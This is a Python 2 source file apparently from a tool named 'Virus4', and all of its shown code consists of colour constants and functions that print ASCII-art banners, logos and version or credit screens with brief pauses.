#!/usr/bin/env python
# -*- coding: utf-8 -*-

import time, os, sys, marshal, random, webbrowser, hashlib, binascii
from urllib2 import Request, urlopen, URLError, HTTPError
from optparse import OptionParser
import socket,threading,logging,urllib
from urllib import urlopen, urlencode
from re import search



#colors
g='\033[1;32m'
p='\033[1;35m'
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
y='\033[1;33m'
def sem_1():
 time.sleep(0.01)
 print red +''
 time.sleep(0.01)
 print ""
 print ""
 print green +' _____  '+red +' _      ______      ________  '+purple +"__     ______  _    _"
 time.sleep(0.01)
 print green +'|_   _|' +red +' | |    / __ \ \    / /  ____| '+purple +"\ \   / / __ \| |  | |"
 time.sleep(0.01)
 print green + '  | |  ' +red +' | |   | |  | \ \  / /| |__    '+purple + " \ \_/ / |  | | |  | |"
 time.sleep(0.01)
 print green + '  | |  ' +red +' | |   | |  | |\ \/ / |  __|   '+purple + "  \   /| |  | | |  | |"
 time.sleep(0.01)
 print green +' _| |_  '+red +'| |___| |__| | \  /  | |____  '+purple  +  "   | | | |__| | |__| |"
 time.sleep(0.01)
 print green +'|_____| '+red +'|______\____/   \/   |______| '+purple   + "   |_|  \____/ \____/"
 time.sleep(0.01)
 print ""
 print ""
 print ""
 time.sleep(0.01)
 print  cyan  +'             __      ___                  _  _     '
 time.sleep(0.01)
 print purple +'             \ \    / (_)                | || |    '
 time.sleep(0.01)
 print green  +'              \ \  / / _ _ __ _   _ ___  | || |_   '
 time.sleep(0.01)
 print blue  + "               \ \/ / | | '__| | | / __| |__   _|  "
 time.sleep(0.01)
 print yellow +'                \  /  | | |  | |_| \__ \    | |    '
 time.sleep(0.01)
 print reset + '                 \/   |_|_|   \__,_|___/    |_|    '
 print ""
 print ""
 time.sleep(0.01)
 print '                     '+blue+'V' +green+ '  i' +reset+ '  r' +purple+ '  u' +cyan+ '  s' +yellow+ '  4' +green +' ^_^'
 time.sleep(0.01)

def sem_2():
 sem_1()
 print cyan+'''         `://-::.`                          `-++syhs` '''
 time.sleep( 0.01)
 print cyan+'''          dNNNNNNNds-                      `odNNmddmm`              '''
 time.sleep( 0.01)
 print cyan+'''          /mmmmdddmNdo-                   :hmdhhddmN+               '''
 time.sleep( 0.01)
 print cyan+'''           /Nmmdddhhho++`     ''' +red+'Virus4'+cyan+'''     /hdhhhhhhdm-               '''
 time.sleep( 0.01)
 print cyan+'''            hmdhhhyho/s/o.              /ddhhyyyyyhm:               '''
 time.sleep( 0.01)
 print cyan+'''            omdyyyso/.-s/s.            .hhdyyyysssyho               '''
 time.sleep( 0.01)
 print cyan+'''            omdyyyys+-..o/s```..```.``.oddyyo+/:://oo`              '''
 time.sleep( 0.01)
 print cyan+'''            /mddysss+::-.+y/``..``...`.ymhhho/:.-/+s/`              '''
 time.sleep( 0.01)
 print cyan+'''            `+ddyyss/---.`sh.``-``...`.hdyyhssss+::::/++:`          '''
 time.sleep( 0.01)
 print cyan+'''          -+syyyyyyy:oo:..-y: `````..``dsyyyyhhh/--:+sdNNm:         ''' 
 time.sleep( 0.01)
 print cyan+'''        .smmdhysosyy.-:...-+y//``  ``:-mdhhhyyysoshddmmNNNN/        '''
 time.sleep( 0.01)
 print cyan+'''        ymmdsyyyssso/::-:/+yNd/`     /dNNdyhhhhhshdmmmmmNMMm`       '''
 time.sleep( 0.01)
 print cyan+'''       +mmmhosyyyys::+shdmNNd:`.-    ::sdddhddddhhdmmmmmNMN/        '''
 time.sleep( 0.01)
 print cyan+'''       oNmmhyyyyhdhhhdhhs/+---``-` ``/.`-.:`:+odh+sydmNMNy-         '''
 time.sleep( 0.01)
 print cyan+'''     ``.+mmmmddmmdysmh//-.:--.:.-....:-.---..........:+/-`          '''
 time.sleep( 0.01)
 print cyan+'''       ..-ohNNNho::://::://+////::::::::::::-----.......``       '''
 time.sleep( 0.01)
 print cyan+'''        `...---------:::::::::::::------------.......````           '''
 time.sleep( 0.01)
 print cyan+'''           `````````````...........```````````````````              '''
 time.sleep(0.01) 
def sem_3():
 sem_1()
 print cyan+'''                                       .-.              '''
 time.sleep(0.01)
 print cyan+'''                                       : `-`        '''
 time.sleep(0.01)
 print cyan+'''                                     -o. .:/-           '''                                  
 time.sleep(0.01)
 print cyan+'''                                     -o   ``:/              '''           
 time.sleep(0.01)
 print cyan+'''                                    .++      .:             '''
 time.sleep(0.01)
 print cyan+'''                                     ./       .-.               '''                          
 time.sleep(0.01)
 print cyan+'''                           '''+red+'Virus4'+cyan+'''     o..   .  /- -                                     '''
 time.sleep(0.01)
 print cyan+'''                        `.`..-:-`    .sh+-.`:- :`:.                                        '''
 time.sleep(0.01)
 print cyan+'''                        hshmmmdddhhdmNmooyhhh+:o/:-                         '''
 time.sleep(0.01)
 print cyan+'''                       `+smmNmNNmmmNNNdyyhddmNd+.                      '''
 time.sleep(0.01)
 print cyan+'''                         .dmmmNNmmmNNNhyyhddddh.                          '''
 time.sleep(0.01)
 print cyan+'''                         `hmmhdNmmmNNMmdssshNdy`                                           '''
 time.sleep(0.01)
 print cyan+'''                        -dyh:  .//+/sNmso+-+Ndy+                                               '''
 time.sleep(0.01)
 print cyan+'''                         s/s.        dy+s  `:::`                                             '''
 time.sleep(0.01)
 print cyan+'''                         -so/.`      h/o:                                                         '''
 time.sleep(0.01)
 print cyan+'''                         `hsoys` `   s-y/`                                                   '''
 time.sleep(0.01)
 print cyan+'''                          -hdh/`````.h:shh+`````                                             '''
 time.sleep(0.01)
 print cyan+'''                        ``.--.``````.Ndh:-.`````````````        '''
 time.sleep(0.01)
 print cyan+'''                     `````..`````````:/:.```````````````````                                '''
 time.sleep(0.01)
 print cyan+'''                `````````....````````.`..```````````````````                                  '''
 time.sleep(0.01)
 print cyan+'''               ``````````......``````-`..```````````````````````                            '''
 time.sleep(0.01)
 print cyan+'''        ``````````````````...........-...`````````````````````````````````                   '''
 time.sleep(0.01)
 print cyan+'''````````````````````````....----.....--...````````````````````````````````                      '''
 time.sleep(0.01)
 print cyan+'''````````````````````````.........-------....``````````````````````````````                     '''
 time.sleep(0.01)
 print cyan+'''``````````````````````````........------......`````````````````````````````     '''
 time.sleep(0.01)
 print cyan+'''````````````````````````````.........---.......````````````````````````````       '''
 time.sleep(0.01)
 print cyan+'''````````````````````````````....................```````````````````````````   '''
 time.sleep(0.01)
 print cyan+'''````````````````````````........................``````````````````````````` '''
 time.sleep(0.01)
 print cyan+'''................````...............................```````````````````````'''   
 time.sleep(0.01)
 print cyan+'''................................................................```````'''    
 time.sleep(0.01)
 print cyan+'''.........'''+green+'Github : https://github.com/Amerlaceset'+cyan+'''...............................''' 
 time.sleep(0.01)
 print cyan+'''........................ Amer Dzz { '''+red+'Virus4'+cyan+''' } .............................'''         
 time.sleep(0.01)
 print cyan+'''.....................................................................      '''
 time.sleep(0.01)                              
def sem_4():
 sem_1()
 print red+'''                             `...-........`                   '''
 time.sleep(0.01)
 print red+'''                        `-:/::::--------:///-                '''
 time.sleep(0.01)
 print red+'''                      .//::::--...```.....--/o:`             '''
 time.sleep(0.01)
 print red+'''                    `:+/::::--.`         ``..:oo-            '''
 time.sleep(0.01) 
 print red+'''                   `/+////:--.`             `.-+y/           '''
 time.sleep(0.01)
 print red+'''                   :+///+/:--..`             `.:+y/          '''
 time.sleep(0.01)
 print red+'''                  -+///o+::::--...``         ``-:oy-         '''
 time.sleep(0.01)
 print red+'''                 `/+/+/oo/:-----::::-.`      ``.:+ys         '''
 time.sleep(0.01)
 print red+'''   -/....        .+o+s/o:.``  `.----//:-``````.::+yy         '''
 time.sleep(0.01)
 print red+'''   :+so:`.       .ossh++:.``     `.:--/o/:----:::+ys         '''
 time.sleep(0.01)
 print red+'''   `/so.``       `oyhdyosys+:``    .//:/soo++//::sy:         '''
 time.sleep(0.01)
 print red+'''   -o//:.`.       `ydy+/-sNdo+:.`  `.s+-/yhyyo+:ohy.         '''
 time.sleep(0.01)
 print red+'''  `///sys:```      -+++-`sd-./+o/-` `/s/-oo/::::-.:y+        '''
 time.sleep(0.01)
 print red+'''    `````:+-`.`    `:/s/.`//:/:/hy/.`-syo+-..`````/s+        '''
 time.sleep(0.01)
 print red+'''          `:+.`.`   `-/++.`-/oshdsoyyyysh/-+shmmo/-`         '''
 time.sleep(0.01)
 print red+'''            `+/`.-`  :y++s+:.`.``.:yh+yhomNNNMm/+            '''
 time.sleep(0.01)
 print red+'''              -+:`-:-s+:oh++/+++osyoyyhmsysyys-o/       .::.  '''
 time.sleep(0.01)
 print red+'''               `/o.`/+:+/ho://://+o/o+oyo+--///-       /y/.:. '''
 time.sleep(0.01)
 print red+'''                 .+/.:+s+::o++-/::/://+++o:`        `-+o:`-- '''
 time.sleep(0.01)
 print red+'''                   -o/+o++-/Nd/::.-.-:::+/    `.-::::-```.s- '''
 time.sleep(0.01)
 print red+'''                    `+ho+/:-dMNMNy:/y+/::`.-:::-```......./: '''
 time.sleep(0.01)
 print red+'''                      .o++/:/dNmmm/:++::::.``......`         '''
 time.sleep(0.01)
 print red+'''                        /++/::::++/+/-.`.--..`               '''
 time.sleep(0.01)
 print red+'''                        `+s+/+/:/+s-::--`                    '''
 time.sleep(0.01)
 print red+'''                    `.:///oyo+++//+`                         '''
 time.sleep(0.01)
 print red+'''                .-:::-..-:++---://-:`                        '''
 time.sleep(0.01)
 print red+'''           `-:::-``----.`      `:o:`--`                      '''
 time.sleep(0.01)
 print red+'''   `....-:/:-``---.`             `:+:.-.                     '''
 time.sleep(0.01)
 print red+'''  --`..-..``--.`                   `-+-.-.                   '''
 time.sleep(0.01)
 print red+''' `+/:/:```-.           '''+cyan+'Virus4'+red+'''        `:/..:-`                '''
 time.sleep(0.01)
 print red+'''    `/y- -`           '''+cyan+'AmerrDzz'+red+'''         `/+/.....-            '''
 time.sleep(0.01)
 print red+'''     `++:.                               +o```-::            '''
 time.sleep(0.01)
 print red+'''                                         `+/:/-              '''
 time.sleep(0.01)
def sem_5():
 sem_1()
 time.sleep(0.01)
 print cyan+'                          ````....````'
 time.sleep(0.01)
 print cyan+'                    `.:oyhmNMMMMMMMMNmdyo/-`'
 time.sleep(0.01)
 print cyan+'                `./ymMMMMMMNNMMMMMMMNMMMMMMNho-`'
 time.sleep(0.01)
 print cyan+'              .+hMMMMMMMMMM+ .::/:. -MMMMMMMMMMdo-`' 
 time.sleep(0.01)
 print cyan+'           `.sNMMMMMMMMMMMm          dMMMMMMMMMMMMy:`'
 time.sleep(0.01)
 print cyan+'          .oNMMMMMMMMMMMMM/          /MMMMMMMMMMMMMMy-`'
 time.sleep(0.01)
 print cyan+'        `:mMMMMMMMMMMMMMMm::::::::::::NMMMMMMMMMMMMMMN+`'
 time.sleep(0.01)
 print cyan+'       `+MMMMMMMMMMMMMMmssssssssssssssssNMMMMMMMMMMMMMMy.'
 time.sleep(0.01)
 print cyan+'      `oMMMMMMMMMMMMNy/..----:::::-----..+dMMMMMMMMMMMMMh.'
 time.sleep(0.01)
 print cyan+'     `/MMMMMMMMMMMMMMMMMs.   `-+:`   `:NMMMMMMMMMMMMMMMMMs`'
 time.sleep(0.01)
 print cyan+'     .mMMMMMMMMMMMMMMMMM+    `/ms.    .NMMMMMMMMMMMMMMMMMM:'
 time.sleep(0.01)
 print cyan+'    `+MMMMMMMMMMMMMMMMMMMdyydMMMMMmhyhNMMMMMMMMMMMMMMMMMMMh`'
 time.sleep(0.01)
 print cyan+'    `hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN.'
 time.sleep(0.01) 
 print cyan+'    `mMMMMMMMMMMMMMMMMMMN+mMMMMMMMMMNsyMMMMMMMMMMMMMMMMMMMM-'
 time.sleep(0.01)
 print cyan+'    `dMMMMMMMMMMMMMMMMMMy  :hMMMMMmo` :MMMMMMMMMMMMMMMMMMMM-'
 time.sleep(0.01)
 print cyan+'    `yMMMMMMMMMMMMMMMMMM+  `oMMMMMh-  `MMMMMMMMMMMMMMMMMMMN.'
 time.sleep(0.01)
 print cyan+'     /MMMMMMMMMNdyo+/:::` oNMMMMMMMMh- :::/+oshmMMMMMMMMMMy`'
 time.sleep(0.01)
 print cyan+'     .dMMMMMMy.          :MMMN`  :MMMy          `/NMMMMMMN-'
 time.sleep(0.01)
 print cyan+'      :NMMMMN           sMMMMMh .mMMMMd.          oMMMMMMo`'
 time.sleep(0.01)
 print cyan+'      `/NMMMm           :NMMMMo  dMMMMh           +MMMMMs`'
 time.sleep(0.01)
 print cyan+'       `:NMMM`           -NMMN.  /MMMd`  `:V/     yMMMMo`'
 time.sleep(0.01)
 print cyan+'         -hMM+            .mMy    mMd`  ./+++:   `NMMm/`'
 time.sleep(0.01)
 print cyan+'          `/mm             .m.    +m`            oMNo.'
 time.sleep(0.01)
 print cyan+'            `+-             `     `.            `do.'
 time.sleep(0.01)
 print cyan+'              ```       '+green+'Amerr '+cyan+'{'+red+'Virus4'+cyan+'}         `.`'
 time.sleep(0.01)
 print cyan+'                 ````                      ````'
 time.sleep(0.01)
 print cyan+'                    ``.:+osyhhhhhhyys+/-```'
 time.sleep(0.01)
 print cyan+'                            ```````'
 time.sleep(0.01)
def sem_6():
 sem_1()
 print cyan+"                      _____________________"
 time.sleep(0.01)
 print cyan+"                     (  "+blue+ 'Amer  '+cyan+ '##### '+red+ ' Amer '+cyan+" )"
 time.sleep(0.01)
 print cyan+"                  /_~~~~~~~~~~~~~~~~~~~~~~~~~_\ "
 time.sleep(0.01)
 print cyan+"                /~                             ~\ "
 time.sleep(0.01)
 print cyan+'              .~             '+green+'Virus4 '+cyan+'             ~'
 time.sleep(0.01)
 print cyan+"          ()\/_____                           _____\/() "
 time.sleep(0.01)
 print cyan+"         .-``      ~~~~~~~~~~~~~~~~~~~~~~~~~~~     ``-. "      
 time.sleep(0.01)
 print '      .-~              ____'+yellow+'I Love you'+cyan+'____             ~-.'  
 time.sleep(0.01)
 print cyan+"      `~~/~~~~~~~~~~~~TTTTTTTTTTTTTTTTTTTT~~~~~~~~~~~~\~~` "
 time.sleep(0.01)
 print cyan+'      | | |'+green+' #### #### '+cyan+'|| | | | [] | | | || '+green+'#### ####'+cyan+' | | |'  
 time.sleep(0.01)
 print cyan+"      ;__\|___________|++++++++++++++++++|___________|/__;"
 time.sleep(0.01)
 print cyan+"       (~~====___________________________________====~~~)"
 time.sleep(0.01)
 print cyan+"        \------_____________[Amer DZZ]__________-------/"
 time.sleep(0.01)
 print cyan+"           |      ||         ~~~~~~~~       ||      |"
 time.sleep(0.01)
 print cyan+"            \_____/                          \_____/"
 time.sleep(0.01)
def sem_7():
 sem_1()
 print ''
 time.sleep(0.01)
 print cyan+"""                     _---------."""
 time.sleep(0.01)
 print cyan+"""                 .' #######   ;." """
 time.sleep(0.01)
 print cyan+"""      .---,.    ;@             @@`;   .---,.. """
 time.sleep(0.01)
 print cyan+"""    ." @@@@@'.,'@@            @@@@@',.'@@@@ ". """
 time.sleep(0.01)
 print cyan+"""    '-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;"""
 time.sleep(0.01)
 print cyan+"""       `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'"""
 time.sleep(0.01)
 print cyan+"""         "--'.@@@  -.@        @ ,'-   .'--" """
 time.sleep(0.01)
 print cyan+"""              ".@' ; @       @ `.  ;'"""
 time.sleep(0.01)
 print cyan+"""                |@@@@ @@@     @    ."""
 time.sleep(0.01)
 print cyan+"""                 ' @@@ @@   @@    ,"""
 time.sleep(0.01)
 print cyan+"""                  `.@@@@    @@   ."""
 time.sleep(0.01)
 print cyan+"""                    ',@@     @   ;           _____________"""
 time.sleep(0.01)
 print cyan+"""                     (   3 C    )     /|___ / """+red+"Virus4 Dzz!"+cyan+""" \ """
 time.sleep(0.01)
 print cyan+"""                     ;@'. __*__,."    \|--- \_____________/ """
 time.sleep(0.01)
 print cyan+"""                      '(.,...."/ """
 time.sleep(0.01)
 print ''
def sem_8():
 sem_1()
 time.sleep(0.01)
 print cyan +'          _____________________________________________    '
 time.sleep(0.01)           
 print cyan +'         !\___________________________________________/!\ '
 time.sleep(0.01)         
 print cyan +'         !!                                           !! \ '
 time.sleep(0.01)          
 print cyan +'         !!           Welcome to { '+red+'Virus4'+cyan+' }           !!  \ '
 time.sleep(0.01)         
 print cyan +'         !!                                           !!  ! '
 time.sleep(0.01)
 print cyan +'         !!                                           !!  ! '
 time.sleep(0.01)         
 print cyan +'         !!  version :  { '+red+'5.0.0'+cyan+' }                     !!  ! '
 time.sleep(0.01)         
 print cyan +'         !!                                           !!  ! '
 time.sleep(0.01)         
 print cyan +'         !!                                           !!  ! '
 time.sleep(0.01)         
 print cyan +'         !!  programmer :  { '+red+'Amer DZ'+cyan+' }                !!  ! '
 time.sleep(0.01)         
 print cyan +'         !!                                           !!  ! '
 time.sleep(0.01)         
 print cyan +'         !!                                           !!  ! '
 time.sleep(0.01)        
 print cyan +'         !!  github :  { '+red+'amerlaceset/Virus4'+cyan+' }         !!  ! '
 time.sleep(0.01)         
 print cyan +'         !!                                           !!  ! '
 time.sleep(0.01)         
 print cyan +'         !!                                           !!  / '
 time.sleep(0.01)        
 print cyan +'         !!___________________________________________!! / '
 time.sleep(0.01)        
 print cyan +'         !/___________________________________________\!/ '
 time.sleep(0.01)        
 print cyan +'            __\_____________________________________/__/!_ '
 time.sleep(0.01)           
 print cyan +'           !_________________________________________!/    '       
 time.sleep(0.01)           
 print cyan +'              _____________________________________    '
 time.sleep(0.01)              
 print cyan +'            /oooo  oooo  oooo  oooo  oooo  oooo /!      '    
 time.sleep(0.01)           
 print cyan +'           /ooooooooooooooooooooooooooooooooooo/ / '
 time.sleep(0.01)           
 print cyan +'          /ooooooooooooooooooooooooooooooooooo/ / '
 time.sleep(0.01)         
 print cyan +'         /ooooooooooooooooooooooooooooooooooo/ / '
 time.sleep(0.01)        
 print cyan +'        /C=_________________________________/_/ '
 time.sleep(0.01)
def sem_9():
 sem_1()
 time.sleep(0.01)
 print red+'                        ..:::::::::..       '
 time.sleep(0.01)
 print red+'                    ..:::aad8888888baa:::..      ' 
 time.sleep(0.01)
 print red+'                .::::d:?88888888888?::8b::::.      '
 time.sleep(0.01)
 print red+'              .:::d8888:?88888888??a888888b:::.      '  
 time.sleep(0.01)
 print red+'            .:::d8888888a8888888aa8888888888b:::.      '
 time.sleep(0.01)
 print red+'           ::::dP::::::::88888888888::::::::Yb::::     '
 time.sleep(0.01)
 print red+'          ::::dP:::::::::Y888888888P:::::::::Yb::::     '
 time.sleep(0.01)
 print red+'         ::::d8:::::::::::Y8888888P:::::::::::8b::::     ' 
 time.sleep(0.01)
 print red+'        .::::88::::::::::::Y88888P::::::::::::88::::.     '
 time.sleep(0.01)
 print red+'        :::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::      '
 time.sleep(0.01)
 print red+'        :::::::Y88888888888P::|::Y88888888888P:::::::     '
 time.sleep(0.01)
 print red+'        ::::::::::::::::888:::|:::888::::::::::::::::     '
 time.sleep(0.01)
 print red+"        `:::::::::::::::8888888888888b::::::::::::::'   "
 time.sleep(0.01)
 print red+'         :::::::::::::::88888888888888::::::::::::::   '
 time.sleep(0.01)
 print red+'          :::::::::::::d88888888888888:::::::::::::   '
 time.sleep(0.01)
 print red+'           ::::::::::::88::88::88:::88::::::::::::  '
 time.sleep(0.01)
 print red+"            `::::::::::88::88::88:::88::::::::::'  "
 time.sleep(0.01)
 print red+"              `::::::::88::88::P::::88::::::::'  "
 time.sleep(0.01)
 print red+"                `::::::88::88:::::::88::::::'  "
 time.sleep(0.01)
 print red+"                   ``:::::::::::::::::::''  "
 time.sleep(0.01)
 print red+"                        ``:::::::::''  "
 time.sleep(0.01)
def sem_10():
 sem_1()
 time.sleep(0.01)
 print cyan +"""                     ,                """
 time.sleep(0.01)
 print cyan +"""                     |'.             , """
 time.sleep(0.01)
 print cyan +"""                     |  '-._        / ) """
 time.sleep(0.01)
 print cyan +"""                   .'  .._  ',     /_'-,  """
 time.sleep(0.01)
 print cyan +"""                  '   /  _'.'_\   /._)')  """
 time.sleep(0.01)
 print red +"""                 :   /  '_' '_'  /  _.' """
 time.sleep(0.01)
 print red +"""                 |E |   |Q| |Q| /   / """
 time.sleep(0.01)
 print red +"""               .'  _\  '-' '-'    / """
 time.sleep(0.01)
 print red +"""              .'--.(S     ,__` )  /    """
 time.sleep(0.01) 
 print red +"""                    '-.     _.'  /      """
 time.sleep(0.01)
 print green +"""                  __.--'----(   /   """  
 time.sleep(0.01)
 print green +"""              _.-'     :   __\ / """
 time.sleep(0.01)
 print green +"""             (      __.' :'  :Y """
 time.sleep(0.01)
 print green +"""              '.   '._,  :   :|        """
 time.sleep(0.01)
 print cyan +"""                '.     ) :.__:|      """
 time.sleep(0.01)
 print cyan +"""                  \    \______/ """
 time.sleep(0.01)
 print cyan +"""                   '._D/_Z____]    """                                       
 time.sleep(0.01)
def sem_11():
 sem_1()
 time.sleep(0.01)
 print cyan +"""                            _...----.                """
 time.sleep(0.01)
 print cyan +"""                          .'    .-'`                """
 time.sleep(0.01)
 print cyan +"""                        ,''--..;                 """
 time.sleep(0.01)
 print cyan +"""                       /       |                  """
 time.sleep(0.01)
 print cyan +"""               _______/________|_______               """
 time.sleep(0.01)
 print cyan +"""              `-----/// _\  /_ \\\-----`                  """
 time.sleep(0.01)
 print cyan +"""                .---./ / o\/o \ \.---.                  """
 time.sleep(0.01)
 print cyan +"""               <(_ /// \__/\__/ \\\ _)>   _.---.                  """
 time.sleep(0.01)
 print cyan +"""                '-. //    oo    \\ .-'  .'   .__`\                  """
 time.sleep(0.01)
 print cyan +"""             o    /// __..--..__ \\\   /       \`\|                  """
 time.sleep(0.01)
 print cyan +"""          o-'*'-o //| '\/\/\/\/' |\\  /         ; '                  """
 time.sleep(0.01)
 print cyan +"""          \*\|/*/   ;--. """"  .-;   |   _   _  |                  """
 time.sleep(0.01)
 print cyan +"""         .-'---'-. / \|||-....(|||`\ |  (o) (o) |                  """
 time.sleep(0.01)
 print cyan +"""        /         \ /\           /\|/           |                  """
 time.sleep(0.01)
 print cyan +"""        |  .---,  |/  \         /  ;  '         |                  """
 time.sleep(0.01)
 print cyan +"""        | / e e \ |    '.     .'   |   '-.       \                  """
 time.sleep(0.01)
 print cyan +"""         \|  ^  |/       '---'     |              \_                  """
 time.sleep(0.01)
 print cyan +"""         ()._-_.()     T R I C K   |     .._.----/` \                  """
 time.sleep(0.01)
 print cyan +"""        ,/\'._.'/\. '  .           |    /   ``"-/||\ \                  """
 time.sleep(0.01)
 print cyan +"""       / \/     \/ \     O R       |   |            `7,                  """
 time.sleep(0.01)
 print cyan +"""      |  ^^_____^^  |              | . /// _          |                  """
 time.sleep(0.01)
 print cyan +"""      |oOO`     `OOo|  T R E A T   ; |' / |_) _       |                  """
 time.sleep(0.01)
 print cyan +"""      \| '._____.' |/             /  \-|  |_)/ \ _    |                  """
 time.sleep(0.01)
 print cyan +"""       |::         | '.__     __,;    `|     \_// \   |                  """
 time.sleep(0.01)
 print cyan +"""       |::         |     `````   |     |        \_/  ;                  """
 time.sleep(0.01)
 print cyan +"""       |::         |             |      \           /                  """
 time.sleep(0.01)
 print cyan +"""       \::.        /_____________|       ``'--..___/                  """
 time.sleep(0.01)
 print cyan +"""        '._______.' '-|   |   |-'                 |                  """
 time.sleep(0.01)
 print cyan +"""          |_ | _|     |   |   |               __.-;                  """
 time.sleep(0.01)
 print cyan +"""          \  |  /     /-._|_.-\                    \                  """
 time.sleep(0.01)
 print cyan +"""           \_|_/     /`'-.|.-'`\                   /                  """
 time.sleep(0.01)
 print cyan +"""     jgs  /--T--\   /    .'.    \'-..____.---''''``                  """
 time.sleep(0.01)
 print cyan +"""         (__/ \__)  \____/  \___/                  """
 time.sleep(0.01)
def sem_12():
 sem_1()
 time.sleep(0.01)
 print cyan +"""                             __                """
 time.sleep(0.01)
 print cyan +"""                            |  |              """
 time.sleep(0.01)
 print cyan +"""                            |  |              """
 time.sleep(0.01)
 print cyan +"""                        ___/____\___              """
 time.sleep(0.01)
 print cyan +"""                   _- ~              ~  _              """
 time.sleep(0.01)
 print cyan +"""                - ~                      ~ -_              """
 time.sleep(0.01)
 print cyan +"""              -                               _              """
 time.sleep(0.01)
 print cyan +"""            -         /\            /\          _              """
 time.sleep(0.01)
 print cyan +"""           -         / *\          / *\          _              """
 time.sleep(0.01)
 print cyan +"""          _         /____\        /____\          _              """
 time.sleep(0.01)
 print cyan +"""          _                  /\                   _              """
 time.sleep(0.01)
 print cyan +"""          _                 /__\                  _              """
 time.sleep(0.01)
 print cyan +"""          _      |\                      /|       _              """
 time.sleep(0.01)
 print cyan +"""           -     \ `\/\/\/\/\/\/\/\/\/\/' /      _              """
 time.sleep(0.01)
 print cyan +"""            -     \                      /      -              """
 time.sleep(0.01)
 print cyan +"""              ~    `\/^\/^\/^\/^\/^\/^\/'      ~              """
 time.sleep(0.01)
 print cyan +"""                ~                            -~              """
 time.sleep(0.01)
 print cyan +"""                 `--_._._._._._._._._._.._--'              """
 time.sleep(0.01)
def sem_13():
 sem_1()
 time.sleep(0.01)
 print cyan +"""                            ........              """
 time.sleep(0.01)
 print cyan +"""                            ;::;;::;,              """
 time.sleep(0.01)
 print cyan +"""                            ;::;;::;;,              """
 time.sleep(0.01)
 print cyan +"""                           ;;:::;;::;;,              """
 time.sleep(0.01)
 print cyan +"""           .vnmmnv%vnmnv%,.;;;:::;;::;;,  .,vnmnv%vnmnv,              """
 time.sleep(0.01)
 print cyan +"""        vnmmmnv%vnmmmnv%vnmmnv%;;;;;;;%nmmmnv%vnmmnv%vnmmnv              """
 time.sleep(0.01)
 print cyan +"""      vnmmnv%vnmmmmmnv%vnmmmmmnv%;:;%nmmmmmmnv%vnmmmnv%vnmmmnv              """
 time.sleep(0.01)
 print cyan +"""     vnmmnv%vnmmmmmnv%vnmmmmmmmmnv%vnmmmmmmmmnv%vnmmmnv%vnmmmnv              """
 time.sleep(0.01)
 print cyan +"""    vnmmnv%vnmmmmmnv%vnmmmmmmmmnv%vnmmmmmmmmmmnv%vnmmmnv%vnmmmnv              """
 time.sleep(0.01)
 print cyan +"""   vnmmnv%vnmmmmmnv%vnmm;mmmmmmnv%vnmmmmmmmm;mmnv%vnmmmnv%vnmmmnv,              """
 time.sleep(0.01)
 print cyan +"""  vnmmnv%vnmmmmmnv%vnmm;  mmmmmnv%vnmmmmmmm;  mmnv%vnmmmnv%vnmmmnv              """
 time.sleep(0.01)
 print cyan +"""  vnmmnv%vnmmmmmnv%vn;;    mmmmnv%vnmmmmmm;;    nv%vnmmmmnv%vnmmmnv              """
 time.sleep(0.01)
 print cyan +""" vnmmnv%vnmmmmmmnv%v;;      mmmnv%vnmmmmm;;      v%vnmmmmmnv%vnmmmnv              """
 time.sleep(0.01)
 print cyan +""" vnmmnv%vnmmmmmmnv%vnmmmmmmmmm;;       mmmmmmmmmnv%vnmmmmmmnv%vnmmmnv              """
 time.sleep(0.01)
 print cyan +""" vnmmnv%vnmmmmmmnv%vnmmmmmmmmmm;;     mmmmmmmmmmnv%vnmmmmmmnv%vnmmmnv              """
 time.sleep(0.01)
 print cyan +""" vnmmnv%vnmmmmm nv%vnmmmmmmmmmmnv;, mmmmmmmmmmmmnv%vn;mmmmmnv%vnmmmnv              """
 time.sleep(0.01)
 print cyan +""" vnmmnv%vnmmmmm  nv%vnmmmmmmmmmnv%;nmmmmmmmmmmmnv%vn; mmmmmnv%vnmmmnv              """
 time.sleep(0.01)
 print cyan +""" `vnmmnv%vnmmmm,  v%vnmmmmmmmmmmnv%vnmmmmmmmmmmnv%v;  mmmmnv%vnnmmnv'              """
 time.sleep(0.01)
 print cyan +"""  vnmmnv%vnmmmm;,   %vnmmmmmmmmmnv%vnmmmmmmmmmnv%;    mmmnv%vnmmmmnv              """
 time.sleep(0.01)
 print cyan +"""   vnmmnv%vnmmmm;;,   nmmm;,              mmmm;;     mmmnv%vnmmmmnv'              """
 time.sleep(0.01)
 print cyan +"""   `vnmmnv%vnmmmmm;;,.         mmnv%v;,            mmmmnv%vnmmmmnv'              """
 time.sleep(0.01)
 print cyan +"""    `vnmmnv%vnmmmmmmnv%vnmmmmmmmmnv%vnmmmmmmnv%vnmmmmmnv%vnmmmmnv'              """
 time.sleep(0.01)
 print cyan +"""      `vnmvn%vnmmmmmmnv%vnmmmmmmmnv%vnmmmmmnv%vnmmmmmnv%vnmmmnv'              """
 time.sleep(0.01)
 print cyan +"""          `vn%vnmmmmmmn%:%vnmnmmmmnv%vnmmmnv%:%vnmmnv%vnmnv'              """
 time.sleep(0.01)
def sem_14():
 sem_1()
 time.sleep(0.01)
 print cyan +"""                        aa@@@@@@@@@@@@@aa              """
 time.sleep(0.01)
 print cyan +"""                     a@@@@@@@@@@@@@@@@@@@@@a              """
 time.sleep(0.01)
 print cyan +"""                   a@@@@@@@@@@@@@@@@@@@@@@@@@a              """
 time.sleep(0.01)
 print cyan +"""                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""                 @@@@@@@~~~~@@@@@@@@@~~~~@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""                 @@@@@@      @@@@@@@      @@@@@@              """
 time.sleep(0.01)
 print cyan +"""                 @@@@@@@aaaa@@@@@@@@@aaaa@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """
